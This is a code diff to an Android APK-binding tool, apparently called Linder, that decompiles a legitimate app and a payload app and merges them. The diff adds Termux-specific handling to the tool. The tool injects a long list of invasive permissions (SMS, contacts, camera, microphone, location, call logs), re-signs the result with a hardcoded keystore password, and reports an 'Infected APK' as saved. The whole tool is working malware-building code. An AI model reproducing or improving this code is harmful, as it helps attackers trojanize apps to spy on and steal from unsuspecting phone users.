@@ -24,8 +24,11 @@ else:
 	mv = 'mv'
 	rm = 'rm -rf'
 
-global package, package_name, package_name_path, smali_loc, smali_path,P1
+global package, package_name, package_name_path, smali_loc, smali_path,P1,Termux_Bool
 
+Termux_Bool = False
+if os.path.exists("/data/data/com.termux/files/home/"):
+	Termux_Bool = True
 
 def Update():
 	if os.name == 'nt':
@@ -41,7 +44,7 @@ def Update():
 			o = open('.ver','r')
 			oo = o.read()
 			o.close()
-			os.system(rm + ' .ver')
+# 			os.system(rm + ' .ver')
 			os.system('curl -LO https://github.com/R37r0-Gh057/Linder/raw/master/.ver')
 			u = open('.ver','r').read()
 			if int(oo) == int(u):
@@ -173,7 +176,7 @@ def newsmali(contents,targetstring):
 
 def Bind():
 	try:
-		global out
+		global out,Termux_Bool
 		Perms_List = ['<uses-permission android:name="android.permission.INTERNET"/>','<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>','<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>','<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>','<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>','<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>','<uses-permission android:name="android.permission.READ_PHONE_STATE"/>','<uses-permission android:name="android.permission.SEND_SMS"/>','<uses-permission android:name="android.permission.RECEIVE_SMS"/>','<uses-permission android:name="android.permission.RECORD_AUDIO"/>','<uses-permission android:name="android.permission.CALL_PHONE"/>','<uses-permission android:name="android.permission.READ_CONTACTS"/>','<uses-permission android:name="android.permission.WRITE_CONTACTS"/>','<uses-permission android:name="android.permission.RECORD_AUDIO"/>','<uses-permission android:name="android.permission.WRITE_SETTINGS"/>','<uses-permission android:name="android.permission.CAMERA"/>','<uses-permission android:name="android.permission.READ_SMS"/>','<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>','<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>','<uses-permission android:name="android.permission.SET_WALLPAPER"/>','<uses-permission android:name="android.permission.READ_CALL_LOG"/>','<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>','<uses-permission android:name="android.permission.WAKE_LOCK"/>']
 
 		Feature_List = ['<uses-feature android:name="android.hardware.camera"/>','<uses-feature android:name="android.hardware.camera.autofocus"/>','<uses-feature android:name="android.hardware.microphone"/>']
@@ -206,8 +209,12 @@ def Bind():
 
 		print (CYAN + "[+] Decompiling APKs...\n" + WHITE)
 		os.chdir("TempP/")
-		os.system('apktool d -f %s' % (original))
-		os.system('apktool d -f %s' % (payload))
+		if Termux_Bool:
+			os.system('apktool d -f %s --force-manifest' % (original))
+			os.system('apktool d -f %s' % (payload))
+		else:
+			os.system('apktool d -f %s' % (original))
+			os.system('apktool d -f %s' % (payload))
 
 		print (CYAN + "\ndone." + WHITE)
 	# STEP 3.
@@ -290,7 +297,10 @@ def Bind():
 		subprocess.call(mv + ' '+ str(sys.argv[3]) + ' ..',shell=True)
 		os.chdir('../')
 		print(CYAN + '[+] Signing Infected APK...\n' + WHITE)
-		subprocess.call("apksigner sign --ks release.keystore --ks-pass pass:lmaolmfao %s" % (str(sys.argv[3])),shell=True)
+		if Termux_Bool:
+			subprocess.call("apksigner -p lmaolmfao release.keystore %s" % (str(sys.argv[3])),shell=True)
+		else:
+			subprocess.call("apksigner sign --ks release.keystore --ks-pass pass:lmaolmfao %s" % (str(sys.argv[3])),shell=True)
 		print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(sys.argv[3]),str(os.path.getsize(str(sys.argv[3])))) + WHITE)	
 		subprocess.call(rm + " TempP",shell=True)
 		exit()
@@ -363,7 +373,7 @@ print("====================================================\n\n")
 sleep(1)
 
 # Finally:-
-if os.path.exists("/data/data/com.termux/files/home"):
+if Termux_Bool:
 	print(RED + "WARNING: " + BLUE + "APKTool may not run properly on Termux\n\n" + WHITE)
 
 if not os.path.isfile("release.keystore"):
